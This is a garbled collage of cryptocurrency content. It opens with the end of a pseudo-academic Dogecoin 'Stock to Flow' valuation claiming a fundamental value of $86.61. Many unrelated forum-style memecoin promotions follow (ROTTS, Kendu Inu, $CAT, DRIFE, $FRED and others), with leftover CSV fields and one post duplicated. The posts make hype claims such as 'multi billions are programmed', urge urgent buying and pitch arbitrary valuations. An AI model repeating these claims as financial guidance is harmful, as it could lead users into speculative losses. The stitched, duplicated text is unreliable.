5. Comparison Across Assets: The SFR model allows for a comparison between different assets based on their scarcity. This can be particularly useful in the cryptocurrency market, where different coins have different issuance schedules and caps, affecting their SFR and, consequently, their perceived long-term value.

In summary, the Stock to Flow ratio is a crucial metric for assessing the scarcity and potential long-term value of a coin. It provides a quantitative foundation that helps investors and analysts understand how the rarity of an asset relates to its market value and helps predict how its price may evolve based on changes in supply dynamics. This makes SFR a valuable tool for strategic investment decisions in both commodity markets and the growing field of digital currencies.

# Data and Analysis

For this analysis, we are only using Tesla's total revenue from all its products and services, including the hypothetical addition of robotics and expanded licensing of Full Self-Driving technology, amounts to $250 billion. This figure will serve as the Total Value of Products and Services (TVPS) in our model to estimate the value of a hypothetical digital coin associated with Tesla. Parameters for the Coin Valuation Model:

* Total Value of Products and Services: $250 billion
* Total Supply: 144.33 billion coins
* Velocity of Money: 0.02
* New Annual Supply: 5.256 billion coins

SFR = Total Supply / New Annual Supply = 27.45Base Coin Value = TVPS / (Total Supply \* VOM) = $86.61Coin Value = Base Value \* SFR = $2,377.65This derived coin value reflects the combined economic utility and scarcity of the coin within this modeled framework. It illustrates how significant the scale of Tesla’s operations could potentially influence the value of a digital currency linked to its economic activities and scarcity dynamics. This model provides a theoretical financial metric that can help in understanding the impact of corporate revenue and production strategies on associated digital assets.

# Discussion

In this study, we utilized a composite model integrating traditional economic indicators with modern financial metrics specific to digital currencies to derive the value of a hypothetical coin associated with Tesla's economic activities. The Stock to Flow Ratio is instrumental in differentiating this model from traditional fiat currency models, such as those used for the [$USD](https://x.com/search?q=%24USD&src=cashtag_click). Unlike fiat currencies, which are typically inflationary due to their increasing supply, the modeled digital coin has a predefined supply growth rate, leading to an increasing SFR over time. This increment in the SFR indicates a decreasing rate at which new coins are added relative to the existing supply, enhancing the coin's scarcity and potential value. In contrast to fiat currencies like the USD, which lose purchasing power over time due to inflationary pressures and policy-driven supply increases, a digital currency with a high and increasing SFR is designed to gain purchasing power. This is primarily due to its comparative scarcity and reduced rate of new supply introduction, which, ceteris paribus, should lead to an appreciation in value if demand remains constant or grows. The mechanism here is akin to that of precious metals like gold, which have historically served as hedges against inflation. This model suggests that digital currencies with increasing SFR could command a premium in the financial markets. Investors might view such currencies as safer stores of value over the long term, particularly in economic environments where traditional currencies are depreciating. The analysis thus highlights the potential of [#Dogecoin](https://x.com/search?q=%23Dogecoin&src=hashtag_click)  to not only serve as effective mediums of exchange but also as robust long-term investments that may outperform inflationary fiat currencies in maintaining purchasing power. The increased Stock to Flow Ratio (SFR) of a digital currency like Dogecoin suggests a growing scarcity and potential appreciation in value over time compared to more inflationary currencies such as the USD. In economic terms, as Dogecoin becomes scarcer and its purchasing power potentially increases, the relative cost of goods and services priced in Dogecoin should logically decrease if these prices are indexed to a currency experiencing inflation, like the [USD.To](http://USD.To) integrate this into pricing strategies, businesses could apply an indexed discount for payments made with Dogecoin, reflecting its expected long-term appreciation. This discount reflects not only the current exchange rate but also the anticipated future value of Dogecoin, thereby incentivizing customers to use the cryptocurrency for transactions. It also compensates for the potential 'opportunity cost' of spending a deflationary currency today rather than holding it. This approach can benefit both consumers and businesses:

* For Consumers: It provides a tangible benefit to using Dogecoin over traditional currencies, potentially saving money due to the currency's appreciation.
* For Businesses: It encourages more transactions in Dogecoin, increasing its circulation and utility as a currency. Moreover, businesses that hold onto Dogecoin received from transactions may benefit from its appreciation.

Transforming Dogecoin from a speculative asset into a functional currency also change the dynamics of its volatility:

* Increased Utility: As Dogecoin transitions to being used more as a currency than an asset, its utility in everyday transactions increases. This widespread use can help stabilize its value as it becomes more integrated into regular economic activities.
* Reduced Speculation: When a cryptocurrency like Dogecoin is primarily used for speculation, its price is highly susceptible to market sentiments and speculative trading. As it shifts towards functioning as a currency, its value becomes more closely tied to its utility and less to investor speculation.
* Market Depth and Liquidity: Increased usage as a currency can enhance market depth and liquidity. This means more buyers and sellers at any given time, which typically reduces price volatility because the market can absorb larger transactions without impacting the price significantly.

# Conclusion

The proposed valuation model for [$Doge](https://x.com/search?q=%24Doge&src=cashtag_click) provides a robust framework that combines principles from traditional hard money systems with modern digital economy analytics. This approach allows for a more grounded and economically justified valuation of digital currencies, which can help stabilize perceptions and foster more informed decision-making in financial markets. The base value of $86.61 for [$Doge](https://x.com/search?q=%24Doge&src=cashtag_click) should be regarded as the logical fundamental value of the coin, given the TVPS. The fundamental value is rarely reflected on open markets that are more driven by human sentiment. Factoring in SFR combined with an increasing TVPS can push the coin value to non-reasonable levels when observed from a fundamental perspective. If Dogecoin provides premium access to General Artificial Intelligence, Self Driving Vehicles and Humanoid Robots, the estimated value of ≈$2,500 is too low.

DOGE,Altcoin,Elon Musk is improving Dogecoin transaction efficiency & major exchanges adding DOGE to their crypto offerings,"[Dogecoin](https://www.reddit.com/r/dogecoin/) (DOGE.X) is once again running with the wolves after Tesla’s Elon Musk's [Tweet](https://twitter.com/elonmusk/status/1392974251011895300) on Thursday evening, Tesla and its CEO are “working with Doge” developers to “improve system transaction efficiency.”

Prices across major exchanges including Binance, Bitfinex, FTX, Gemini, and Poloniex are posting around 22% gains over a 24-hour period. The cryptocurrency is currently changing hands for around $0.53. The increase came even as other major cryptocurrencies’ prices sank.

Meanwhile, U.S. cryptocurrency exchange Coinbase announced it would be adding DOGE to its suite of crypto offerings in six to eight weeks, likely due to client demand as has been the case with other major exchanges.

eToro said it’s adding Dogecointo the cryptocurrencies traded on its exchange due to client demand. eToro's 20 million users around the world will now be able to trade the Shiba Inu-represented crypto. It joins the likes of Kraken, Crypto.com, OKEx, and other [exchanges that list the cryptocurrency](https://www.coingecko.com/en/coins/dogecoin#markets).

Gemini Exchange Users Can Now Earn Interest on Dogecoin. The Winklevoss brothers-founded cryptocurrency exchange, has added Dogecoin to the cryptocurrencies supported by its Earn lending program, allowing customers to earn interest on their holdings.

Users can realize as much as 2.25% annual percentage yield (APY) on DOGE, Gemini said in a [blog post](https://www.gemini.com/blog/earn-interest-on-doge-with-gemini-earn-which-now-holds-usd2b-in-assets) on Saturday. Under the program, users can earn between 1.26% and 7.75% APY.

The MATIC network has been exploded, apart from a few 'not so minor' hiccups in the market recently, the growth has been strong and we have seen an influx of people into the Polygon mainnet.

&#x200B;

One of the first memecoins (bare with me here) to launch on the network was PolyDoge, but it is already setting itself up as much more than a memecoin. With staking, liquidity pools and brand new NFT's released yesterday for people who were holding the coin a few days ago, PolyDoge is setting the gold standard on this young and upcoming network. 

&#x200B;

There is a great community on telegram, who stayed positive throughout the dip, with amazing fan art and even a song on spotify! (released today). Pop in for a look and join the 4150 and growing strong community who genuinely believe that this (still small market cap) coin is destined for great things.

**What is the GloryDoge project?**

**IDO privates sales and presales** are most of the time the earliest and best opportunities one can get to invest in a promising project. However, it is always hard for investors to know how the developers will spend their funds. In addition to this, the crypto world has seen increasing numbers of bad actors who use such funds raising techniques, in the combination of fake roadmaps and promises, to drain the wallets of investors who fell for their game.

**GloryDoge** is here to fix this. We aim to build a **secure DeFi ecosystem** to help bring creative ideas to life and protect **early investors' funds. It comes with two products- GloryDox and GloryPad.**

**GloryDox** is a fully automated and 100% secure identity verification for projects founders built on top of the solid KYC technology from **Veriff.** It is a paltform to securely verify team's identity using a fully automated KYC to build trust for potential investors. You will need a valid document such as Passport, Driving License, National ID. To make things easier, we will direct you to a mobile verification process to complete your verification. Verification approval usually takes less than 5 minutes. Once you're verified, you'll instantly receive your verification badge to add to your website.

**Demo scheduled for 23-01-2022 17:30 IST on TG channel (available on website)**

**GloryPad**, is a place where developers can organize IDOs to raise initial funds and support their projects. It's not only that! GloryPad will completely shift control over the raised funds from the developers to the investors by making it impossible for the developers to use the funds, in any way, without the investors' consent and approval.

DOGE,Altcoin,ROTTSCHILD ($ROTTS) is ready to take off. Did you miss Doge or Shiba? Don’t make the same mistake again,"$ROTTS: the most ambitious doggie meme token yet under the radar! Unique metaverse, unique utilities, the best whitepaper by far. Less than 620 holders! Do yourself a favor, come and see!

Hey everyone. I'm here to talk to you about ROTTS. The Rottschild family plans to become richer and more famous than the Rothschild family, by creating a one-of-a-kind metaverse!

- **Less than 650 holders, with a very low market cap**!
- **Liquidity locked in for 100 years**
- **Audit of CertiK**
- **And the best whitepaper of all meme tokens**!

Have a look here: [ROTTSCHILD.com](https://ROTTSCHILD.com) (website) [ROTTSCHILD.com/whitepaper.pdf](https://ROTTSCHILD.com/whitepaper.pdf) (whitepaper) and all the links you need on Linktree: [Linktr.ee/rotts](https://Linker.ee/rotts)

Right now, they are doing a special Black Friday operation! Each purchase, regardless of the amount, adds 1 million ROTTS to the prize pool, which will be shared between 3 randomly selected winners. 

🥇 First draw wins 50% of the pot

🥈 Second draw wins 30% of the pot

🥉 Third draw wins 20% of the pot

This project has a strong symbol: the struggle of the CRYPTO currency against the FIAT currency. Their goal is to get the whole planet to adopt crypto-currencies (not just their own), to speed up the transition from FIAT currency to CRYPTO currency to bring freedom to everyone to enjoy their money as they wish.

Their projects are very ambitious (ROTTS Academy, ROTTS me, ROTTS Pay) and so far the team has always delivered what they promised. This is a project that is still flying under the radar because the big marketing push hasn't started yet. 

**This is the time to position yourself for those who are looking for a nice project with a low marketcap**.

DYOR.

I'm here to shill Riskmoon cause hoge and safemoon's price is really really high. yeah it could go x2 - x5 but when?  
Safemoon's price on dexguru is 121,000 - 157, 000  
Riskmoon's price on dexguru is 150 (LOL) imagine having a x500 = 75,000 and it will be on only half of safemoon's price or x 1000 and safemoon is still higher.

The thing is, the price is pretty nice now, but I'm unsure about the longterm thing on Doge. Any idea on longterm, I mean, I know it's all pretty unsure. Or just keep my Doge?",7,2017-05-24 18:58:59,17

Right now I'm looking at quarkcoin.  The fact that it has a plan for long-term minting similar to doge is very attractive looking to me.  I'm also watching the development of curecoin, solarcoin, primecoin, and other coins that have bases in something beyond just their own ledgers, since I think that's a very interesting strategy.

**1)  SHYTOSHI KUSAMA INVOLVED**

**Shiba Inu lead Dev Shytoshi Kusama**, considered among the **top 50** most influential people in the whole crypto space, is confirmed to be following Kendu Inu and holding a bag since at least $1M market cap.

**Kendu Miazaki**, Kendu Inu Dev, is one of his friends, and he made sure to bring Shy in at the right time.

 

 

**2)  HUGE WALLETS APING (MULTIMILLIONAIRES)**

Wallets with **10+ million dollars' worth of ETH** that had been inactive since the last cycle got back to life only to buy Kendu Inu.

It has even been confirmed that a **Middle Eastern Prince** holds a bag.

Other millionaires (and multimillionaires) are confirmed holders and part of the ecosystem as well.

 

 

**3)  KENDU MIAZAKI**

Kendu Inu Dev ""**Miazaki**"" is an unhinged individual always ready to rock & roll.

He is a **SHIB multimillionaire** (his bag was worth 50+ million dollars at ATH IIRC), and that explains the close connection with **Shytoshi** and other **SHIB Ogs** that are now part of Kendu.

Apart from his **incredible work ethic** and **crazy personality**, him being a loaded individual makes the project much easier to trust because one of the most common reasons for projects to fail is broke millionaire-wannabe devs who can't resist the urge of dumping on everybody to make a quick buck.

He recently admitted on a X Spaces that he doesn't even have that big of a bag. He said ""**I’m maybe top 20, if even that**”.

He always says he does not do this for money because he already has money. He does this because he likes to “**build**”  and to allow other common people to become “**stupid rich**”.

 

 

**4)  COMMUNITY**

What can I even say about the **Kendu Army**? Everybody knows about it.

With unmatched work ethic and always ready to spread the word, the Kendu Army is what makes Kendu…**KENDU**!

People who join Kendu go from being dirty, tiny-handed jeets to 7.6ft tall, muscular chads with strong and big hands.

You’re soon taught that success depends on you and to ask yourself, “**What can I do for $KENDU?**” instead of waiting for the team to release the “**next big thing**” and hoping for a pump while doing absolutely nothing to help.

**We’ve got relentless shillers** on any social media known to humanity, people making Kendu **energy drinks**, people managing a Kendu **merch store**, people with Kendu **tattoos**, people smashing plates on their heads in the name of Kendu, and much more.

 

 

https://preview.redd.it/yj18zclypcad1.png?width=606&format=png&auto=webp&s=5cc6f00a283f679392bf8bf5a874e7767a353358



**5)  ORGANIC GROWTH**

Kendu Inu fully believes in organic growth.

Apart from financing for the first **CEX** listing, so that “**normies**” were able to join the project without having to go through **DeFi** if not tech-savvy enough to avoid being scammed, **Kendu Inu does not pay for any listing, call on Tg, post on X, video on YT or any other thing you can think of**.

All the influencers that talk about Kendu or CEXs that listed us have had to buy supply from the liquidity pool like any other person.

Kendu Miazaki explained this from the very beginning.

“**It might be slower, but it works**.” is what he used to say.

**Organic growth allows you to build a strong floor of diamond-handed holders** who fully believe in the project and do not believe in random FUD.

On the other hand, if you build your floor with people sent by influencers, everybody is ready to jeet at the first chance because they’re just there for a quick buck and do not see the bigger picture.

 

 

**6)  UTILITY AND SHIB ECOSYSTEM**

Even though all details have yet to be revealed, it is known that **$KENDU** will play a role in the Shib ecosystem, which might explain Shytoshi’s involvement in Kendu Inu.

Make no mistake, though, Miazaki has always said that **Kendu has its own identity** and will not just be one of the small dogs existing under the SHIB umbrella.

One of the first Kendu utilities, named **Kendu Chads**, will be released in the following weeks after being thoroughly tested for months by Miazaki’s team of developers.

 

https://preview.redd.it/iizlff0bqcad1.jpg?width=1195&format=pjpg&auto=webp&s=6a5643a5c028cd785132e6788480639d6bf2ebb6





**7)  THE DOG OF THIS CYCLE**

“Never two without three”.

People love dogs and always will. **DOGE** and **SHIB** were the first two dogs to reach **$10b**+ market cap.

**$KENDU** has everything it needs to be the third this coming bull run.

 

 

**8) 275M MARKET CAP WHEN THE MARKET WAS BLEEDING**

Kendu Inu reached an **ATH** of over **$275M market cap** when the whole crypto market, from BTC to all the shitcoins, was bleeding badly.

**Kendu is your hedge against the market** and will not wait for BTC to reach new ATHs before jumping to $1b market cap and beyond.

With that being said, when the actual bull run starts and all the random shitcoins are in green, what do you think will happen to a **strong project** like Kendu?

Multi billions are programmed.

 



**9)  BUILT ON ETH**

**Kendu Inu is only on ETH**. Love it or hate it, Ethereum is the king of all chains and sees fewer scams than all the other jeet chains such as SOL and BASE.

Since Kendu Inu is on ETH, and the liquidity pool is paired with ETH (KENDU:ETH), **when ETH goes up in value, so does KENDU**. As simple as that.

The news of the coming **ETH ETF** is super bullish news for all KENDU holders, both **short-term** and **long-term** investors.

 



**10)  GREAT-LOOKING CHART**

Even CMC, in their recent article, admitted that $KENDU chart looks very good and **on the verge of a breakout** from a pure TA standpoint, and they’re not aware of all the **alphas** behind the projects and all the future implementations that are going to be unveiled.

So, if you like technical analysis, you will like Kendu Inu chart.

**11)  GOAL: FIRST MEME COIN TO EVER CROSS $100b**

While every other project in the meme sphere tries hard to reach $1b market cap, at Kendu inu, we think that to be an embarrassing goal.

While Miazaki says that **“$10b is programmed**”, meaning it is inevitable, the real goal that excites our community is to be the first meme coin ever to cross $100b market cap.

Miazaki’s bio on Telegram says: “**Taking $KENDU to $100 BILLION and beyond!**”

Many experts expect this to be a “**super cycle**” and even more a “**meme super cycle**”, meaning we expect not only more liquidity to be deployed in the whole crypto space compared to 2021, but also that **meme coins will grab a much bigger % of that liquidity** flowing around compared to last cycle.

**We can then expect new ATHs for well-established projects** such as DOGE and SHIB, and that’s why, at KENDU, we’re working towards that $100b MC goal, which will not look as unrealistic at the peak of the bull run as it may does right now.

 



**12)  LOW MARKET CAP ≠ MORE GAINS**

Many people have been led to believe that the lower the market cap of a certain token, the better chance of making a 100x or 1000x. That is SO wrong and misleading.

90% or more of the “projects”, especially when launched on Solana or Base, **are complete scams**. Period.

The other 0.99% are projects created with the best intentions, but that, unfortunately, are going absolutely nowhere.

**Kendu Inu, at this stage, is bulletproof**. It has proved its value to everybody. “**We’re too big to fail**” is what Miazaki always says.

Kendu is going nowhere but up.

With such ambitious goals, a **100x means reaching about $15b market cap** (at the time of this writing), which is far from being out of reach for Kendu, especially considering we are about to enter what it’s supposed to be the **biggest cycle ever** (especially for meme coins).

Another thing to keep in mind is that when you invest in **super-low MC projects**, liquidity is so thin that any whale exiting their position leads to a cascade of sales caused by fear, especially since it’s not uncommon for investors of small projects to hold 5-10% of the total supply.

On bigger projects, instead, since liquidity is way thicker, you can **enter and exit your positions more accurately** without having nightmares about being rugged while asleep.

**13) BEAUTIFUL SUPPLY REDISTRIBUTION**

At Kendu Inu, redistribution is ongoing **24/7**. When the market cap goes up, the number of holders goes up. When the market cap goes down, even significantly, the number of holders still goes up!

And that’s counting on-chain holders only! **With millions of $ of daily volume on CEXs**, God knows how many holders we actually have.



To make money with altcoins, especially memes, you need to understand two things:

1. What a good project is
2. Buy when everybody else is afraid to do it.

Kendu IS a good project.

Now, you have the opportunity to buy or top up your bags at 40% of the ATH.



If you like Kendu, this is the best time to become part of the army. See you on the other side!

DOGE,Altcoin,Where is the Staking and Restaking Narrative going in future ,"  
coming across many projects offering staking and restaking which is liquid ofcourse, for me am planning to dominate my prowess to just one of it and put more interest on Puffer Finance. This platform stands out with its fun, community driven approach to memecoins, allowing users to explore a variety of meme based digital assets, trade in a marketplace and also participate in liquidity pools while enjoying the vibrant meme culture.  
  
What really stood out for me is how Puffer Finance combines liquid staking with restaking, enabling users to access their staked assets while continuing to earn rewards. This feature boosts investment efficiency and opens up more opportunities in the DeFi space.  
  
Puffer Finance also let users create their own memecoins and actively participate in governance, prioritizing transparency, security and fairness. With tools for discovering new memecoins and managing crypto investments, Puffer Finance fosters a lively community eager to innovate and shape the future of meme based cryptos.   
  
With the $PUFFER token set to list on October 14 which is today on various exchanges, users can take advantage of events like PoolX, Launchpool and Candybomb to earn more $PUFFER through staking and trading on Bitget and many others cex. 

what do you think about the Future of Restaking and Staking in next 3 Years ?

**What is $DRF?**

DRIFE is a decentralized ride-hailing platform that utilizes blockchain technology to create a peer-to-peer network for drivers and riders. The platform operates on the DRF token, which serves as the native currency for all transactions on the platform. The primary goal of DRIFE is to revolutionize the traditional ride-hailing industry by creating a more transparent, secure, and cost-effective system that benefits both drivers and riders.

Unlike traditional ride-hailing platforms, DRIFE is a decentralized platform that eliminates intermediaries, giving riders and drivers more control over their interactions. By leveraging blockchain technology, DRIFE creates a trustless and transparent environment that enables direct peer-to-peer interactions between riders and drivers. This direct connection allows for more personalized and customized ride-hailing experiences, where riders can choose drivers based on specific criteria, such as driver rating, car type, and other preferences.

**What solutions $DRF give to the ride-hailing industry?**

The ride-hailing industry is facing a range of issues that are affecting both drivers and passengers. These issues include high commissions, platform-dictated pricing, lack of transparency and freedom, closed governance, and no loyalty.

We can name few more problems in other competitors – sky-rocketing commissions, platform-dictated pricings, lack of transparency and freedom, closed governance, no loyalty and more.

How does DRIFE deal with those problems exactly?

DRIFE offers innovative solutions to some of the key challenges faced by traditional ride-hailing services. Its zero-commission structure, market-dictated pricing, transparency and freedom to choose an open governance model, and incentivized participation make it a unique and sustainable platform that benefits both riders and drivers.

* No commission - One of the key features of DRIFE is its zero-commission structure. Unlike traditional ride-hailing services, DRIFE does not charge drivers any commission fees for using its platform to connect with riders. This leads to better incomes for drivers who can pass on some of these benefits to riders in the form of reduced commuting costs.
* Market-Dictated Pricing - DRIFE's model offers a unique dynamic pricing mechanism that is based on an auction model. This allows market forces to determine the prices for each ride, rather than a fixed pricing system that is imposed by the platform. The middleman's profit is also eliminated, which means that the prices are even lower for riders, while drivers receive higher incomes for their services.
* Transparency & Freedom to Choose - Transparency and freedom of choice are essential features of the DRIFE platform. The platform's decentralized mobility marketplace and flexible peer-to-peer design give riders and drivers greater control over their experience. Riders can select drivers based on various criteria, such as rating, fare price, pickup time, or specific needs, like child seats or disability access.
* Open Governance - DRIFE's open governance model is a unique approach that aims to create a self-sustaining ecosystem where every stakeholder plays an important role in its growth and maintenance. This is achieved through a franchise model that allows entities such as riders, drivers, fleet owners, and local transportation and logistics companies to govern themselves in a fair and efficient way.
* Incentivized Participation - DRIFE's rewards program is a key aspect of incentivizing participation from both drivers and riders on the platform. By offering rewards for active engagement, DRIFE encourages users to complete rides, provide feedback, and participate in the platform's governance process. These rewards can come in the form of DRF tokens or other perks, which can be used to redeem discounts, free rides, or other benefits

**Do $DRF have a working referral system?**

The Drife team have organized and explained in depth their loyalty and referral system. You can check it out in their whitepaper following this link:

[https://drife.gitbook.io/white-paper/tokenomics](https://drife.gitbook.io/white-paper/tokenomics)

**What is the future development plan of $DRF?**

Integration with other modes of transportation - DRIFE plans to integrate with other modes of transportation, such as public transit, to provide riders with a seamless and convenient end-to-end transportation experience.

* International expansion - DRIFE aims to expand its services to other countries, providing riders and drivers around the world with access to its platform.
* Continued technological Advancements - DRIFE will continue to develop and implement new technologies, such as artificial intelligence and machine learning, to improve the ride-hailing experience for its users.
* DRIFE is exploring a new infrastructure layer designed exclusively for mobility, utilizing mobility primitives as a crucial part of the blockchain. This unique approach has the potential to foster innovation in the industry by enabling the community to build mobility-specific use cases.

* Full Control: Aventa will have full control over the protocol, governance, and native features (such as tokenomics, and consensus mechanisms).
* Security: $AVENT is a high-value project which requires robust security and decentralization (like a new base-layer blockchain or ecosystem).
* Independent Ecosystem: Aventa is building its own self-sustaining blockchain ecosystem with native applications and DApps.

DOGE,Altcoin,Looking for the next 1B+ memecoin? $CAT on BNB is the one!,"I gotta tell you about a coin that is about to blow up. I am talking about $CAT.

The market cap of cat themed memecoins is 10 times lower than the market cap of dog memecoins. This is why I believe we are just a few months away from the biggest cat season ever. And Simon\*\*’\*\*s Cat will be the leading coin of this meta for sure.

But here is the thing, $CAT is still extremely early considering the insane potential of this project.

Team behind $CAT is loaded and I really mean this. These guys are running massive paid marketing campaigns, and they are throwing down serious funds to get this thing out there and create something that will stay.

They already listed $CAT on the majority of the biggest exchanges in the world like OKX, [Gate.io](http://Gate.io), KuCoin or HTX.

But it's not just about the money, the team is super organized and working around the clock. You can tell they are not messing around. They are constantly bringing bullish news and when they promise something they always deliver it. And you can see it even on the chart because $CAT is sitting at 230M market cap

Thanks to this fact, the community members are helping with everything they can help with because they know $CAT is a once in a lifetime opportunity.

Honestly, don’t sleep on this. Projects like $CAT do not stay under billion for too long so it is just a matter of time until Binance lists $CAT and it will become one of the biggest memecoins ever.

I’m not telling you what to do, but if you are looking for something with huge upside potential but something not as risky as other memecoins, $CAT could be exactly what you have been waiting for.

DOGE,Altcoin,Doge Volume Value Question in reference to Litecoin,Doge has gotten alot more attention in the last few days and with that the trade volume is increasing with price and network.  If doge volume maintains a higher volume than Litecoin consistently how long until its market cap value surpasses Litecoin?  By my math this makes 1 doge= $0.02 or par with ripple which also has 100 Billion units.,5,2014-01-20 15:33:30,2

**What is $DRF?**

DRIFE is a decentralized ride-hailing platform that utilizes blockchain technology to create a peer-to-peer network for drivers and riders. The platform operates on the DRF token, which serves as the native currency for all transactions on the platform. The primary goal of DRIFE is to revolutionize the traditional ride-hailing industry by creating a more transparent, secure, and cost-effective system that benefits both drivers and riders.

Unlike traditional ride-hailing platforms, DRIFE is a decentralized platform that eliminates intermediaries, giving riders and drivers more control over their interactions. By leveraging blockchain technology, DRIFE creates a trustless and transparent environment that enables direct peer-to-peer interactions between riders and drivers. This direct connection allows for more personalized and customized ride-hailing experiences, where riders can choose drivers based on specific criteria, such as driver rating, car type, and other preferences.

**What solutions $DRF give to the ride-hailing industry?**

The ride-hailing industry is facing a range of issues that are affecting both drivers and passengers. These issues include high commissions, platform-dictated pricing, lack of transparency and freedom, closed governance, and no loyalty.

We can name few more problems in other competitors – sky-rocketing commissions, platform-dictated pricings, lack of transparency and freedom, closed governance, no loyalty and more.

How does DRIFE deal with those problems exactly?

* DRIFE offers innovative solutions to some of the key challenges faced by traditional ride-hailing services. Its zero-commission structure, market-dictated pricing, transparency and freedom to choose an open governance model, and incentivized participation make it a unique and sustainable platform that benefits both riders and drivers.
* No commission - One of the key features of DRIFE is its zero-commission structure. Unlike traditional ride-hailing services, DRIFE does not charge drivers any commission fees for using its platform to connect with riders. This leads to better incomes for drivers who can pass on some of these benefits to riders in the form of reduced commuting costs.
* Market-Dictated Pricing - DRIFE's model offers a unique dynamic pricing mechanism that is based on an auction model. This allows market forces to determine the prices for each ride, rather than a fixed pricing system that is imposed by the platform. The middleman's profit is also eliminated, which means that the prices are even lower for riders, while drivers receive higher incomes for their services.
* Transparency & Freedom to Choose - Transparency and freedom of choice are essential features of the DRIFE platform. The platform's decentralized mobility marketplace and flexible peer-to-peer design give riders and drivers greater control over their experience. Riders can select drivers based on various criteria, such as rating, fare price, pickup time, or specific needs, like child seats or disability access.
* Open Governance - DRIFE's open governance model is a unique approach that aims to create a self-sustaining ecosystem where every stakeholder plays an important role in its growth and maintenance. This is achieved through a franchise model that allows entities such as riders, drivers, fleet owners, and local transportation and logistics companies to govern themselves in a fair and efficient way.
* Incentivized Participation - DRIFE's rewards program is a key aspect of incentivizing participation from both drivers and riders on the platform. By offering rewards for active engagement, DRIFE encourages users to complete rides, provide feedback, and participate in the platform's governance process. These rewards can come in the form of DRF tokens or other perks, which can be used to redeem discounts, free rides, or other benefits

**Do $SRF have a working referral system?**

The Drife team have organized and explained in depth their loyalty and referral system. You can check it out in their whitepaper following this link:

[https://drife.gitbook.io/white-paper/tokenomics](https://drife.gitbook.io/white-paper/tokenomics)

**What is the future development plan of $DRF?**

Integration with other modes of transportation - DRIFE plans to integrate with other modes of transportation, such as public transit, to provide riders with a seamless and convenient end-to-end transportation experience.

* International expansion - DRIFE aims to expand its services to other countries, providing riders and drivers around the world with access to its platform.
* Continued technological Advancements - DRIFE will continue to develop and implement new technologies, such as artificial intelligence and machine learning, to improve the ride-hailing experience for its users.
* DRIFE is exploring a new infrastructure layer designed exclusively for mobility, utilizing mobility primitives as a crucial part of the blockchain. This unique approach has the potential to foster innovation in the industry by enabling the community to build mobility-specific use cases.

DOGE,Altcoin,Can $CATS Make a Comeback? Token Faces Uncertainty After Price Drop and Bold New Moves,"The $CATS token hit the market with excitement, but its low market cap quickly raised red flags for investors. After an early price surge, it soon crashed to $0.0000576, following the same path as other struggling tokens like $DOGS.

  
Right now, $CATS is priced at $0.0001228, down 75% from its peak. Compared to $DOGS, which boasts a market cap of $401.96 million, $CATS sits far behind at just $73.78 million. The rapid price drop has left the token oversold, hinting at a possible rebound, though market confidence is still shaky.

  
In a bid to bring traders back, the Bitget team has launched the CATS x Bitget Fortune Ticket event. For every $10 of $CATS trades, participants earn tickets for a chance to win prizes. This event, running until Oct 14, is designed to boost short-term trading and spark new interest in the token.

  
Adding to the mix, the announcement of Season 2 has triggered rumors of a potential buyback strategy, which could help drive prices higher. If successful, $CATS could climb to $0.0003 or more. But if the plan doesn’t deliver, the token could see further losses.

  
In short, $CATS is a risky, speculative investment. Its future depends on how well the team executes their upcoming strategies. Investors should proceed with caution and watch developments closely.

DOGE,Altcoin,FRED Raccon best Community Meme ,"  
with a heavy heart Today, I want to share with you a story that's both heartwarming and heart-wrenching, centered around a unique meme coin on the Solana blockchain called **$FRED**  
  
  
Fred was not just any raccoon; he was a beloved resident of a wildlife sanctuary in Pine City, living a life that many of us wish for our wild friends - safe, cared for, and loved. However, life took a harsh turn for Fred and his squirrel friend, P'Nut, when the New York State Department of Environmental Conservation (NYSDEC) intervened, leading to both animals being taken from their sanctuary. Sadly, Fred was euthanized, leaving behind a legacy and a movement.  


In honor of Fred's memory, **$FRED** was created on the Solana blockchain. This meme coin doesn't just play into the fun, speculative nature of crypto markets; it carries a message. It symbolizes:  
  
\-Animal Welfare: The coin aims to raise awareness and possibly funds for animal rescue and rehabilitation.  
\-Community Support: With every transaction, there's a narrative of standing up for those who can't speak for themselves, it's listed on Bitget with a community Giveaway to win upto free 30$   
  
\-Memorializing Fred: Every time you hold or trade $FRED, you're keeping the spirit of Fred alive, promoting discussion on animal rights, and how we treat our wildlife.  
\-Meme with a Mission:Unlike many meme coins that exist purely for speculation, $FRED has a narrative that resonates, encouraging a community around a cause.  
  
Let’s come together to remember Fred, support animal sanctuaries, and perhaps find a new way to invest in crypto that feels right. $FRED isn't just another coin; it's a symbol of what community and crypto can achieve when they align for a cause.  
  
Feel free to share your thoughts, experiences If you're in the fred community

DOGE,Altcoin,$URO price chart looking good but could this be the beginning of a DeSci Memecoin evolution?,"It is obvious that Blockchain has revolutionized every industry including science. Currently, memecoin is trending in the industry and it seems even DeSci is now getting involved. Could this novel intersection between biotechnology, health, and cryptocurrency change the landscapt? $URO, known as Urolithin A, has emerged as an intriguing meme coin within the realm of decentralized science (DeSci). The Solana meme token embodies the health and anti-aging potential which is why it is currently trending in Pump Science platform.

Urolithin A is a metabolite produced by the gut microbiota from ellagitannins found in foods like pomegranates, berries, and nuts. Its discovery has piqued interest due to its promising health benefits, particularly in the field of aging and longevity. Research has shown that Urolithin A can enhance mitochondrial function, a process known as mitophagy, where damaged mitochondria are recycled, promoting cellular health and potentially extending lifespan. This compound has been linked to increased muscle strength, reduced inflammation, and improvements in metabolic health, showcasing its anti-aging attributes.

Notably, analysts on twitter havce start hyping the project and predicting of a DeSci memecoin trend since Bitget and other top exchange have already listed the token. The price chart is looking good but could this signal a DeSci memecoin revolution?

DOGE,Altcoin,$CAT is the leading memecoin of this bullrun!,"It’s a cat season and $CAT (Simon’s Cat) will be the leading coin of this bullrun. Some huge news are coming this month and you definitely do not want to miss this.

$CAT might look like a basic cat coin but opposite is the truth. The team behind $CAT is experienced, rich and know exactly what to do and how to do it to make this project really reach billions.

The community is absolutely insane. With nearly 230k holders, 80k Telegram members and insane 200k X followers. It is just a matter of time until we reach billions.

$CAT is on the BNB blockchain. This means there is a high of possibility of it getting listed on Binance soon. After all, $CAT is sitting at 230M market cap so it is more than ready to get listed there.

What is also important to mention about $CAT is that

* $25 million worth of supply was already burned
* $CAT is listed on a majority of the biggest exchanges such as HTX, Kucoin or [Gate.io](http://Gate.io)
* $CAT is also partnered with FLOKI, one of the biggest coins ever
* The art and meme itself is also known worldwide and therefore many more people will get in

$CAT will do something we have never seen before. I truly believe it can become the biggest meme project in the whole world and this is your chance to be still extremely early considering the upside potential.

Do not miss your chance to change your life with $CAT on BNB

